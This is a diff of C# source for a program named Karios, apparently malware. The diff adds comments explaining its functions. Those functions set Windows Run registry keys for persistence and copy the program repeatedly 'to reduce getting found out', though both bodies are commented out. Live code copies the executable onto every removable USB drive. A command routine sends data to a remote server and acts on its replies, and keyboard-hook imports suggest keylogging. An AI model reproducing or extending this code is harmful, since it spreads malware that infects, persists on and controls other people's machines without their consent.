@@ -63,9 +63,6 @@ namespace Karios
                 Application.Run();
                 //UnhookWindowsHookEx(_hookId);
             }
-
-            Console.WriteLine("IF Statement did not work... exiting");
-            Console.ReadKey();
         }
 
         private static void CommandGet()
@@ -170,7 +167,8 @@ namespace Karios
                     else
                         paramaters = paramaters + "&reverse=false";
 
-
+                    //What this is doing is setting a big string full of commands, then sends it to a server. 
+                    //The server checks if they contain certain things, then sends back infomation
                     var commands = "";
                     try
                     {
@@ -295,6 +293,7 @@ namespace Karios
         /// </summary>
         public static void SetStartup()
         {
+            //Changes the startup registary keys to run Karios at startup.
             /*
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
@@ -308,6 +307,7 @@ namespace Karios
 
         public static void Duplicate()
         {
+            //Copies itself into the startup multiple times to reduce getting found out
             /*
             if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
             {
@@ -321,11 +321,12 @@ namespace Karios
         {
             var alldrives = DriveInfo.GetDrives();
 
-
+            // Gets infomation about drives
             foreach (DriveInfo d in alldrives)
             {
                 if (d.DriveType == DriveType.Removable && d.IsReady)
                 {
+                    //Checks if they are removable, then adds Karios into the USB with a 'friendly name'
                     File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
                         d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                 }
@@ -378,9 +379,10 @@ namespace Karios
 
         public static IPAddress GetIpAddress(string hostName)
         {
+            //Currently Broken
             var ping = new Ping();
             var replay = ping.Send(hostName);
-
+            //Pings googles servers and gets hostname
             return replay != null && replay.Status == IPStatus.Success ? replay.Address : null;
         }
 
@@ -390,7 +392,7 @@ namespace Karios
             {
                 try
                 {
-                    Process.Start(_website);
+                    Process.Start(_website); //PreppedCommand[8]
                 }
                 catch
                 {
@@ -434,13 +436,14 @@ namespace Karios
         //private static extern IntPtr SetWindowsHookEx(int idHook,
           //  LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
+        //This imports the DLL's needed for some stuff
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+           // IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
